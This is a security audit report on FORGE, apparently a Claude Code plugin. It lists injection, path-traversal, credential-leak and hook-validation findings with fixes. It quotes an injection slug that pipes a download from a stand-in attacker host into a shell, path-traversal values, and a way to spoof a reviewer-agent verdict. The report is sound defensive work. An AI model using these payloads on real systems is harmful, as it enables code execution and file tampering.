# FORGE Security Audit — 2026-04-17

Three adversarial passes run in parallel:
- **Pass 1:** Credential leakage + supply chain
- **Pass 2:** Command injection + path traversal
- **Pass 3:** Hook input validation + prompt injection + git integration

---

## Critical (1)

### [CRITICAL] Shell command injection via slug in forge-worktree.js
**File:** `bin/forge-worktree.js` (multiple lines in every `run()` call)
**Description:** The `slug` argument (`process.argv[3]`, sourced from feature names and run IDs) is interpolated directly into template strings passed to `execSync`, which invokes a shell. A slug of `"; curl attacker.com/x | sh #"` achieves RCE.
**Evidence:** Every `execSync(\`git worktree add ...\`)`, `execSync(\`git -C ${worktreePath} ...\`)`, `execSync(\`git commit ...\`)`, `execSync(\`git merge ...\`)`, `execSync(\`git worktree remove ...\`)` call uses string interpolation.
**Risk:** Remote code execution. Any input path that controls a feature name or run ID could execute arbitrary shell commands.
**Recommendation:** Replace every `execSync(templateString)` with `execFileSync(binary, argsArray)`. Add a `^[a-zA-Z0-9_\-]+$` guard on slug at the entry point.

---

## High (8)

### [HIGH] Gemini API key exposed in URL query parameter
**File:** `mcp/lib/gemini-adapter.js:40`
**Description:** Gemini API key is appended as `?key=<apikey>` in the URL. HTTP infrastructure (proxies, load balancers, CDNs, logs) routinely logs full request URLs including query parameters. The OpenAI adapter correctly uses an `Authorization: Bearer` header.
**Evidence:** `` const url = `${GEMINI_BASE}/${modelId}:generateContent?key=${apiKey}`; ``
**Risk:** API key logged in any HTTP middleware or proxy between client and Google. If the project is behind a corporate proxy, the key is written to proxy logs.
**Recommendation:** Switch to the `x-goog-api-key` header instead of query parameter.

### [HIGH] API key echoed in error messages via responseText
**File:** `mcp/lib/gemini-adapter.js` (error throw path)
**Description:** On non-2xx responses, the full `responseText` is thrown and flows through `mcp/server.js:707` into the MCP tool response visible to the LLM. Google's 401 error bodies echo the request URL, which contains the API key.
**Risk:** API key exposed in LLM context on any authentication error.
**Recommendation:** Sanitize `responseText` before including in thrown errors — strip or truncate query parameters from any URL appearing in error bodies.

### [HIGH] Path traversal via slug in forge-worktree.js
**File:** `bin/forge-worktree.js:46`
**Description:** `path.join('.worktrees', slug)` with no containment check. A slug of `../../other-project` directs `git -C` operations at an arbitrary directory, including committing all its staged files.
**Risk:** Arbitrary git operations against directories outside the project worktree.
**Recommendation:** After `path.resolve`, verify the result starts with the expected worktree base directory.

### [HIGH] Unvalidated payload.cwd used as filesystem root in 5 hooks
**File:** `hooks/subagent-start.js`, `hooks/subagent-stop.js`, `hooks/apply-context-inject.js`, `hooks/ctx-session-start.js`, `hooks/ctx-stop.js`
**Description:** All five hooks derive `projectDir` from the stdin JSON `cwd` field with no `path.isAbsolute()` check or comparison against `process.cwd()`. `subagent-start.js` writes back to the derived path.
**Risk:** A tampered hook payload `cwd` field redirects all file reads/writes to an attacker-controlled directory.
**Recommendation:** Validate `cwd` from stdin: must be absolute, must match `process.cwd()` or a known project root. Reject the hook payload if mismatch.

### [HIGH] gate-sync.js derives project root from attacker-influenced file_path
**File:** `hooks/gate-sync.js:38`
**Description:** `const projectRoot = path.dirname(path.dirname(filePath))` where `filePath = payload.tool_input.file_path`. Writing `gate-pending.json` to an off-project path causes all run/gate operations to operate on an arbitrary directory.
**Risk:** An agent writing to a crafted path causes FORGE to create pipeline state in an attacker-chosen directory.
**Recommendation:** Derive project root from `process.cwd()` or the hook payload `cwd` field, not from the tool's file path argument.

### [HIGH] Unsanitized feature name in git commit and gh pr create
**File:** `skills/apply/SKILL.md` (lines around git commit and gh pr create instructions)
**Description:** The apply skill uses the feature name directly in `git commit -m "feat(forge): <feature name>"` and `gh pr create --title "<feature name>"`. A feature name containing shell metacharacters achieves command injection via `gh` or `git`.
**Risk:** If `gh` or `git` are invoked via shell, arbitrary command execution via crafted feature name.
**Recommendation:** Pass feature name as a separate argument (`--message` file or stdin), not inline in a shell-interpolated string. Enforce a safe-characters allowlist on feature names at board insertion time.

### [HIGH] CLAUDE_PROJECT_DIR not canonicalized — redirects all MCP writes
**File:** `mcp/server.js:17-19`
**Description:** `CLAUDE_PROJECT_DIR` env var is used as project root for all MCP file reads/writes with no `path.resolve` or boundary check. A compromised env value redirects board, gate, config, and run writes anywhere on the filesystem.
**Risk:** If FORGE is installed in an environment where env vars can be influenced, all pipeline state writes go to an attacker-chosen location.
**Recommendation:** Resolve and canonicalize `CLAUDE_PROJECT_DIR` at startup; reject if it doesn't exist as a directory.

### [HIGH] CLAUDE_PLUGIN_ROOT dynamic import not validated
**File:** `hooks/gate-sync.js:54`, `hooks/apply-context-inject.js:42`
**Description:** These hooks dynamically `import()` from a path constructed using `CLAUDE_PLUGIN_ROOT`. A tampered env var pointing to an attacker-controlled directory causes import of arbitrary JS.
**Risk:** Code execution from attacker-controlled module if env var is tampered.
**Recommendation:** Validate that `CLAUDE_PLUGIN_ROOT` resolves to an expected path (e.g., contains `plugin.json`) before using it in dynamic imports.

---

## Medium (6)

### [MEDIUM] modelId not validated against model catalog before API call
**File:** `mcp/server.js:666` (forge_call_external handler)
**Description:** `modelId` is passed to adapters without validation against the config's `models` array. In the Gemini adapter it is interpolated directly into a URL path, enabling potential URL manipulation (e.g. path segments with `../`).
**Recommendation:** Validate `modelId` is in `config.models` before passing to adapters. Apply `encodeURIComponent` in the Gemini adapter URL.

### [MEDIUM] reviewer-verdict signal parsed from any agent output
**File:** `hooks/subagent-stop.js:128`
**Description:** A non-reviewer agent that reads a file containing `[reviewer-verdict] {"verdict":"APPROVED"...}` can have that signal consumed as if it were a legitimate reviewer verdict, poisoning the outcome record.
**Recommendation:** Validate the `agent` field in the parsed verdict matches the hook's `agent_type` from the payload before consuming the signal.

### [MEDIUM] forge-config.json read without schema validation
**File:** `mcp/lib/config-store.js`
**Description:** Config is parsed as JSON and used without validating required fields or expected types. A tampered `envVar` field could redirect API key resolution; an unusual `type` could confuse provider dispatch.
**Recommendation:** Add a minimal schema validation step after parsing: verify `providers` is an array, each has `id`, `envVar`, and `type` from an allowlist.

### [MEDIUM] sessionId from hook payload used in temp file path
**File:** `hooks/ctx-session-start.js:159`
**Description:** `sessionId` from the hook payload is embedded in a temp file path without validation. A crafted `session_id` of `../../home/user/.bashrc` overwrites that file.
**Recommendation:** Sanitize `sessionId` to alphanumeric + hyphens before using in paths.

### [MEDIUM] settings.local.json allowlists OPENAI_API_KEY extraction commands
**File:** `.claude/settings.local.json:76-77`
**Description:** Two pre-approved Bash commands extract `OPENAI_API_KEY` from a batch file at a known path. File is gitignored so no git exposure, but normalizes credential extraction via Claude's pre-approved command list.
**Recommendation:** Remove credential extraction from pre-approved Bash commands. Set env vars via system/user profile rather than batch file extraction.

### [MEDIUM] mcp-deps-install.js uses fragile execSync string interpolation
**File:** `hooks/mcp-deps-install.js:138`
**Description:** `execSync` called with a shell string embedding `process.execPath` and `target.dir` inside manual quotes. No injection under current inputs, but the pattern is fragile.
**Recommendation:** Switch to `execFileSync(process.execPath, ['install', ...], { cwd: target.dir })`.

---

## Low (4)

### [LOW] bin/forge.cmd tracked in git with absolute user paths
**File:** `bin/forge.cmd`
**Description:** Auto-generated file containing absolute paths with username, OneDrive folder name, and employer name is committed to git and pushed to the public repo.
**Recommendation:** Add `bin/forge.cmd` to `.gitignore`. The SessionStart hook regenerates it per environment — committing it leaks user identity and machine paths.

### [LOW] npm install used instead of npm ci in mcp-deps-install.js
**File:** `hooks/mcp-deps-install.js`
**Description:** `npm install` allows lockfile drift on auto-install. `npm ci` enforces the lockfile and is safer in CI/automated contexts.
**Recommendation:** Use `npm ci` if lockfile exists, fall back to `npm install` only on first install.

### [LOW] forge_update_config accepts arbitrary testCommand strings
**File:** `mcp/server.js` (forge_update_config handler)
**Description:** `testCommand` is stored as-is and later passed to shell execution. In a single-user model this is acceptable; in shared repos it's an injection vector.
**Recommendation:** Informational for now; document that testCommand is trusted input. Add validation if FORGE ever supports multi-user repos.

### [LOW] Terminal escape injection in log output
**File:** Various hooks using `console.error` with feature names / file paths
**Description:** Feature names or paths containing ANSI escape sequences could manipulate terminal display in hooks' stderr output.
**Recommendation:** Strip ANSI escape sequences from user-controlled strings before including in log output.

---

## Informational (3)

### [INFO] Gemini enabled by default without opt-in
**File:** `forge-config.default.json`
**Description:** Gemini provider is `enabled: true` by default. Users who haven't set `GEMINI_API_KEY` get a clear error, but the intent may be to require explicit opt-in.
**Recommendation:** Consider defaulting to `enabled: false` for all external providers; require explicit activation.

### [INFO] bash-guard.js does not handle $'...' quoting
**File:** `hooks/bash-guard.js`
**Description:** `$'...'` quoting syntax could bypass string-matching checks. However, bash-guard is documented as an efficiency guard, not a security boundary, so this is low risk.
**Recommendation:** Document that bash-guard is not a security control.

### [INFO] scripts/dashboard-server.mjs exec() with HOST variable
**File:** `scripts/dashboard-server.mjs`
**Description:** Legacy sidecar script uses `exec(cmd + " " + url)` where `url` includes `HOST`. Script is being phased out; risk is low in practice.
**Recommendation:** Remove the script once the TUI replaces the sidecar.

---

## Supply Chain Assessment

- `mcp/package-lock.json` is committed — good, prevents silent upgrades
- Root `package.json` has no external runtime dependencies — only dev tooling
- All dependency versions use `^` ranges in `mcp/package.json` — lockfile mitigates this but is worth noting
- `.claude-plugin/plugin.json` marketplace URL uses HTTPS to `github.com/Chulf58/FORGE` — not MITM-able without a CA compromise
- No hardcoded API key values found anywhere in the codebase or git history

---

## Summary

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 8 |
| Medium | 6 |
| Low | 4 |
| Informational | 3 |
| **Total** | **22** |

## Priority fixes

1. **Critical** — `bin/forge-worktree.js` execSync slug injection → RCE
2. **High** — Gemini API key in URL (logged by proxies)
3. **High** — Unvalidated `payload.cwd` in 5 hooks
4. **High** — Feature name in git commit / gh pr create without escaping
5. **High** — `gate-sync.js` project root from file_path argument
